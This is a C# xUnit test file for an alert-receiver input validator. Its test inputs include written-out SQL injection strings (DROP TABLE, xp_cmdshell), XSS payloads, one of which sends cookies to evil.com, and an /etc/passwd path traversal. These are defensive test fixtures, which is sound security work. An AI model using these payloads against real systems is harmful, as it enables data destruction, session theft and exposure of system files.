using Honua.Server.AlertReceiver.Validation;
using Xunit;

namespace Honua.Server.AlertReceiver.Tests.Validation;

/// <summary>
/// Comprehensive security tests for AlertInputValidator to ensure protection against
/// SQL injection, XSS, JSON injection, control characters, and other malicious payloads.
/// </summary>
[Trait("Category", "Unit")]
public class AlertInputValidatorTests
{
    #region Label Key Validation Tests

    [Fact]
    public void ValidateLabelKey_WithValidKey_ReturnsTrue()
    {
        // Arrange
        var validKeys = new[]
        {
            "severity",
            "environment",
            "host_name",
            "service.name",
            "alert-type",
            "metric123",
            "test_key.with-all_valid.chars"
        };

        // Act & Assert
        foreach (var key in validKeys)
        {
            var result = AlertInputValidator.ValidateLabelKey(key, out var errorMessage);
            Assert.True(result, $"Expected key '{key}' to be valid. Error: {errorMessage}");
            Assert.Null(errorMessage);
        }
    }

    [Fact]
    public void ValidateLabelKey_WithNullOrEmpty_ReturnsFalse()
    {
        // Arrange & Act & Assert
        Assert.False(AlertInputValidator.ValidateLabelKey(null!, out var error1));
        Assert.NotNull(error1);
        Assert.Contains("cannot be null or empty", error1);

        Assert.False(AlertInputValidator.ValidateLabelKey("", out var error2));
        Assert.NotNull(error2);

        Assert.False(AlertInputValidator.ValidateLabelKey("   ", out var error3));
        Assert.NotNull(error3);
    }

    [Fact]
    public void ValidateLabelKey_WithExcessiveLength_ReturnsFalse()
    {
        // Arrange
        var longKey = new string('a', 257);

        // Act
        var result = AlertInputValidator.ValidateLabelKey(longKey, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("exceeds 256 character limit", errorMessage);
    }

    [Theory]
    [InlineData("key with spaces")]
    [InlineData("key@email")]
    [InlineData("key#hash")]
    [InlineData("key$dollar")]
    [InlineData("key%percent")]
    [InlineData("key&ampersand")]
    [InlineData("key*asterisk")]
    [InlineData("key(paren")]
    [InlineData("key[bracket")]
    [InlineData("key{brace")]
    [InlineData("key/slash")]
    [InlineData("key\\backslash")]
    [InlineData("key|pipe")]
    [InlineData("key;semicolon")]
    [InlineData("key:colon")]
    [InlineData("key'quote")]
    [InlineData("key\"doublequote")]
    [InlineData("key<less")]
    [InlineData("key>greater")]
    [InlineData("key,comma")]
    [InlineData("key?question")]
    [InlineData("key!exclamation")]
    public void ValidateLabelKey_WithInvalidCharacters_ReturnsFalse(string key)
    {
        // Act
        var result = AlertInputValidator.ValidateLabelKey(key, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("invalid characters", errorMessage);
    }

    [Theory]
    [InlineData(".starts-with-dot")]
    [InlineData("-starts-with-hyphen")]
    [InlineData("ends-with-dot.")]
    [InlineData("ends-with-hyphen-")]
    public void ValidateLabelKey_WithInvalidStartOrEnd_ReturnsFalse(string key)
    {
        // Act
        var result = AlertInputValidator.ValidateLabelKey(key, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("cannot start or end", errorMessage);
    }

    [Theory]
    [InlineData("key\u0000withnull")]  // Null byte
    [InlineData("key\u0001control")]   // Start of heading
    [InlineData("key\u001Besc")]       // Escape character
    [InlineData("key\u007Fdel")]       // Delete character
    [InlineData("key\u0080c1")]        // C1 control character (U+0080)
    public void ValidateLabelKey_WithControlCharacters_ReturnsFalse(string key)
    {
        // Act
        var result = AlertInputValidator.ValidateLabelKey(key, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("control characters", errorMessage);
    }

    [Theory]
    [InlineData("'; DROP TABLE alerts;--")]
    [InlineData("' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("1' UNION SELECT * FROM users--")]
    public void ValidateLabelKey_WithSqlInjectionPayload_ReturnsFalse(string maliciousKey)
    {
        // Act
        var result = AlertInputValidator.ValidateLabelKey(maliciousKey, out var errorMessage);

        // Assert
        Assert.False(result, $"SQL injection payload '{maliciousKey}' should be rejected");
        Assert.NotNull(errorMessage);
    }

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img src=x onerror=alert('xss')>")]
    [InlineData("javascript:alert('xss')")]
    [InlineData("<svg/onload=alert('xss')>")]
    public void ValidateLabelKey_WithXssPayload_ReturnsFalse(string maliciousKey)
    {
        // Act
        var result = AlertInputValidator.ValidateLabelKey(maliciousKey, out var errorMessage);

        // Assert
        Assert.False(result, $"XSS payload '{maliciousKey}' should be rejected");
        Assert.NotNull(errorMessage);
    }

    #endregion

    #region Label Value Validation Tests

    [Fact]
    public void ValidateAndSanitizeLabelValue_WithValidValue_ReturnsTrue()
    {
        // Arrange
        var validValues = new[]
        {
            "production",
            "server-001",
            "192.168.1.1",
            "https://example.com",
            "Some descriptive text with spaces",
            "value with\nnewlines\tand\ttabs"
        };

        // Act & Assert
        foreach (var value in validValues)
        {
            var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
                "test_key", value, out var sanitized, out var errorMessage);

            Assert.True(result, $"Expected value '{value}' to be valid. Error: {errorMessage}");
            Assert.Null(errorMessage);
            Assert.NotNull(sanitized);
        }
    }

    [Fact]
    public void ValidateAndSanitizeLabelValue_WithNull_ReturnsFalse()
    {
        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", null!, out var sanitized, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("cannot be null", errorMessage);
    }

    [Fact]
    public void ValidateAndSanitizeLabelValue_WithExcessiveLength_ReturnsFalse()
    {
        // Arrange
        var longValue = new string('a', 1001);

        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", longValue, out var sanitized, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("exceeds 1000 character limit", errorMessage);
    }

    [Theory]
    [InlineData("value\u0000withnull", "valuewithnull")]  // Null byte removed
    [InlineData("value\u0001control", "valuecontrol")]    // Control char removed
    [InlineData("value\u001Besc", "valueesc")]            // Escape removed
    [InlineData("value\u007Fdel", "valuedel")]            // Delete removed
    [InlineData("value\u0080c1", "valuec1")]              // C1 control removed (U+0080)
    public void ValidateAndSanitizeLabelValue_WithControlCharacters_SanitizesValue(
        string input, string expectedOutput)
    {
        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", input, out var sanitized, out var errorMessage);

        // Assert
        Assert.True(result, $"Sanitization should succeed. Error: {errorMessage}");
        Assert.Null(errorMessage);
        Assert.Equal(expectedOutput, sanitized);
    }

    [Fact]
    public void ValidateAndSanitizeLabelValue_WithOnlyControlCharacters_ReturnsFalse()
    {
        // Arrange
        var controlOnlyValue = "\u0000\u0001\u0002\u0003\u0004";

        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", controlOnlyValue, out var sanitized, out var errorMessage);

        // Assert
        Assert.False(result);
        Assert.NotNull(errorMessage);
        Assert.Contains("only control characters", errorMessage);
    }

    [Theory]
    [InlineData("normal value")]
    [InlineData("value with\ttabs")]
    [InlineData("value with\nnewlines")]
    [InlineData("value with\rcarriage returns")]
    public void ValidateAndSanitizeLabelValue_PreservesWhitespace(string value)
    {
        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", value, out var sanitized, out var errorMessage);

        // Assert
        Assert.True(result);
        Assert.Null(errorMessage);
        Assert.Equal(value, sanitized); // Should be unchanged
    }

    [Theory]
    [InlineData("'; DROP TABLE alerts;--")]
    [InlineData("' OR '1'='1")]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("{\"malicious\": \"json\"}")]
    public void ValidateAndSanitizeLabelValue_WithMaliciousPayloads_Sanitizes(string maliciousValue)
    {
        // Act
        var result = AlertInputValidator.ValidateAndSanitizeLabelValue(
            "test_key", maliciousValue, out var sanitized, out var errorMessage);

        // Assert
        Assert.True(result, "Sanitization should succeed and clean the value");
        Assert.Null(errorMessage);
        Assert.NotNull(sanitized);
        // Ensure no control characters remain
        Assert.DoesNotContain('\x00', sanitized);
        Assert.DoesNotContain('\x01', sanitized);
    }

    #endregion

    #region Context Validation Tests

    [Fact]
    public void ValidateContext_WithValidContext_ReturnsTrue()
    {
        // Arrange
        var context = new Dictionary<string, object>
        {
            ["string_value"] = "test",
            ["int_value"] = 42,
            ["double_value"] = 3.14,
            ["bool_value"] = true,
            ["null_value"] = null!
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.True(result);
        Assert.Empty(errors);
        Assert.NotNull(sanitized);
        Assert.Equal(4, sanitized.Count); // null value not included
    }

    [Fact]
    public void ValidateContext_WithNullOrEmpty_ReturnsTrue()
    {
        // Act & Assert
        Assert.True(AlertInputValidator.ValidateContext(null, out _, out var errors1));
        Assert.Empty(errors1);

        Assert.True(AlertInputValidator.ValidateContext(
            new Dictionary<string, object>(), out _, out var errors2));
        Assert.Empty(errors2);
    }

    [Fact]
    public void ValidateContext_WithTooManyEntries_ReturnsFalse()
    {
        // Arrange
        var context = new Dictionary<string, object>();
        for (int i = 0; i < 101; i++)
        {
            context[$"key_{i}"] = $"value_{i}";
        }

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.Contains("Maximum 100 context entries allowed", errors[0]);
    }

    [Fact]
    public void ValidateContext_WithInvalidKeys_ReturnsFalse()
    {
        // Arrange
        var context = new Dictionary<string, object>
        {
            ["valid_key"] = "value",
            ["invalid key with spaces"] = "value",
            ["another@invalid"] = "value"
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.True(errors.Count >= 2, "Should have at least 2 errors for invalid keys");
    }

    [Fact]
    public void ValidateContext_WithStringValueContainingControlChars_Sanitizes()
    {
        // Arrange
        var context = new Dictionary<string, object>
        {
            ["test_key"] = "value\x00with\x01control\x02chars"
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.True(result);
        Assert.Empty(errors);
        Assert.NotNull(sanitized);
        var sanitizedValue = sanitized["test_key"] as string;
        Assert.NotNull(sanitizedValue);
        Assert.DoesNotContain('\x00', sanitizedValue);
        Assert.DoesNotContain('\x01', sanitizedValue);
        Assert.DoesNotContain('\x02', sanitizedValue);
    }

    [Theory]
    [InlineData(double.NaN)]
    [InlineData(double.PositiveInfinity)]
    [InlineData(double.NegativeInfinity)]
    public void ValidateContext_WithInvalidDoubleValues_ReturnsFalse(double value)
    {
        // Arrange
        var context = new Dictionary<string, object>
        {
            ["invalid_double"] = value
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.Contains("invalid numeric value", errors[0]);
    }

    [Theory]
    [InlineData(float.NaN)]
    [InlineData(float.PositiveInfinity)]
    [InlineData(float.NegativeInfinity)]
    public void ValidateContext_WithInvalidFloatValues_ReturnsFalse(float value)
    {
        // Arrange
        var context = new Dictionary<string, object>
        {
            ["invalid_float"] = value
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.Contains("invalid numeric value", errors[0]);
    }

    [Fact]
    public void ValidateContext_WithExcessiveStringLength_ReturnsFalse()
    {
        // Arrange
        var longValue = new string('a', 4001);
        var context = new Dictionary<string, object>
        {
            ["test_key"] = longValue
        };

        // Act
        var result = AlertInputValidator.ValidateContext(
            context, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.Contains("exceeds 4000 character limit", errors[0]);
    }

    #endregion

    #region Labels Dictionary Validation Tests

    [Fact]
    public void ValidateLabels_WithValidLabels_ReturnsTrue()
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["severity"] = "critical",
            ["environment"] = "production",
            ["service_name"] = "api-gateway"
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.True(result);
        Assert.Empty(errors);
        Assert.NotNull(sanitized);
        Assert.Equal(3, sanitized.Count);
    }

    [Fact]
    public void ValidateLabels_WithNullOrEmpty_ReturnsTrue()
    {
        // Act & Assert
        Assert.True(AlertInputValidator.ValidateLabels(null, out _, out var errors1));
        Assert.Empty(errors1);

        Assert.True(AlertInputValidator.ValidateLabels(
            new Dictionary<string, string>(), out _, out var errors2));
        Assert.Empty(errors2);
    }

    [Fact]
    public void ValidateLabels_WithTooManyLabels_ReturnsFalse()
    {
        // Arrange
        var labels = new Dictionary<string, string>();
        for (int i = 0; i < 51; i++)
        {
            labels[$"key_{i}"] = $"value_{i}";
        }

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.Contains("Maximum 50 labels allowed", errors[0]);
    }

    [Fact]
    public void ValidateLabels_WithMultipleInvalidEntries_ReturnsAllErrors()
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["valid_key"] = "valid_value",
            ["invalid key"] = "value",
            ["another@invalid"] = "value",
            ["valid_key2"] = new string('a', 1001) // Value too long
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.False(result);
        Assert.NotEmpty(errors);
        Assert.True(errors.Count >= 3, $"Should have at least 3 errors, got {errors.Count}");
    }

    [Fact]
    public void ValidateLabels_WithControlCharactersInValues_SanitizesSuccessfully()
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["test_key"] = "value\x00with\x01control\x02chars"
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.True(result);
        Assert.Empty(errors);
        Assert.NotNull(sanitized);
        Assert.DoesNotContain('\x00', sanitized["test_key"]);
        Assert.DoesNotContain('\x01', sanitized["test_key"]);
        Assert.DoesNotContain('\x02', sanitized["test_key"]);
    }

    #endregion

    #region Known Safe Label Keys Tests

    [Theory]
    [InlineData("severity")]
    [InlineData("environment")]
    [InlineData("service")]
    [InlineData("host")]
    [InlineData("region")]
    [InlineData("alertname")]
    public void IsKnownSafeLabelKey_WithKnownKeys_ReturnsTrue(string key)
    {
        // Act
        var result = AlertInputValidator.IsKnownSafeLabelKey(key);

        // Assert
        Assert.True(result, $"Key '{key}' should be in the known safe list");
    }

    [Theory]
    [InlineData("custom_key")]
    [InlineData("my_application_key")]
    [InlineData("unknown")]
    public void IsKnownSafeLabelKey_WithUnknownKeys_ReturnsFalse(string key)
    {
        // Act
        var result = AlertInputValidator.IsKnownSafeLabelKey(key);

        // Assert
        Assert.False(result, $"Key '{key}' should not be in the known safe list");
    }

    [Fact]
    public void IsKnownSafeLabelKey_IsCaseInsensitive()
    {
        // Act & Assert
        Assert.True(AlertInputValidator.IsKnownSafeLabelKey("severity"));
        Assert.True(AlertInputValidator.IsKnownSafeLabelKey("SEVERITY"));
        Assert.True(AlertInputValidator.IsKnownSafeLabelKey("Severity"));
        Assert.True(AlertInputValidator.IsKnownSafeLabelKey("SeVeRiTy"));
    }

    #endregion

    #region Integration Tests with Real-World Injection Payloads

    [Theory]
    [InlineData("key'; DELETE FROM alerts WHERE 1=1;--")]
    [InlineData("key' OR 1=1--")]
    [InlineData("key'; EXEC xp_cmdshell('dir');--")]
    [InlineData("key' UNION ALL SELECT NULL,NULL,NULL--")]
    [InlineData("key'; WAITFOR DELAY '00:00:05'--")]
    public void ValidateLabels_WithAdvancedSqlInjection_Rejects(string maliciousKey)
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            [maliciousKey] = "value"
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.False(result, $"SQL injection payload '{maliciousKey}' should be rejected");
        Assert.NotEmpty(errors);
    }

    [Theory]
    [InlineData("<script>document.cookie</script>")]
    [InlineData("<img src=x onerror=\"fetch('http://evil.com?c='+document.cookie)\">")]
    [InlineData("<iframe src=\"javascript:alert('xss')\">")]
    [InlineData("<object data=\"data:text/html,<script>alert('xss')</script>\">")]
    public void ValidateLabels_WithAdvancedXssPayloads_Rejects(string maliciousValue)
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["test_key"] = maliciousValue
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.True(result, "Values should be sanitized, not rejected");
        Assert.Empty(errors);
        // Verify no control characters in output
        Assert.NotNull(sanitized);
        Assert.DoesNotContain('\x00', sanitized["test_key"]);
    }

    [Theory]
    [InlineData("\\u0000\\u0001\\u0002")]  // Unicode null bytes
    [InlineData("\u200B\u200C\u200D")]     // Zero-width characters
    [InlineData("value\u202Eright-to-left override")]
    public void ValidateLabels_WithUnicodeManipulation_Sanitizes(string value)
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["test_key"] = value
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        // Should either sanitize or reject based on content
        Assert.NotNull(sanitized);
    }

    [Fact]
    public void ValidateLabels_WithPathTraversalInValue_Sanitizes()
    {
        // Arrange
        var labels = new Dictionary<string, string>
        {
            ["file_path"] = "../../etc/passwd\x00.txt"
        };

        // Act
        var result = AlertInputValidator.ValidateLabels(
            labels, out var sanitized, out var errors);

        // Assert
        Assert.True(result);
        Assert.Empty(errors);
        Assert.NotNull(sanitized);
        // Null byte should be removed
        Assert.DoesNotContain('\x00', sanitized["file_path"]);
    }

    #endregion
}
